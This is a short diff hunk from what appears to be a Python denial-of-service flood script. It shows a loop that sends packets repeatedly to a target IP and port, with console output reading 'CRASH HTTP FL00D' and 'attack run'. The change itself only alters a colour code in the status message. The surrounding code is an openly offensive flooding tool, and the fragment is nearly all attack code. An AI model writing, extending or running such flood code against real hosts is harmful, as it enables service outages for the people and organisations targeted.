@@ -57,7 +57,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[94mCRASH  \033[96mHTTP\033[97mFL00D  \033[31m" +str(ip)+ "\033[97m = \033[33mattack run\033[0m")
+			print(i +" \033[94mCRASH  \033[96mHTTP\033[33mFL00D  \033[31m" +str(ip)+ "\033[97m = \033[33mattack run\033[0m")
 		except:
 			print(i +" \033[94mCRASH  \033[95mHTTP\033[97mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[32mattack run\033[0m")
 def run2():
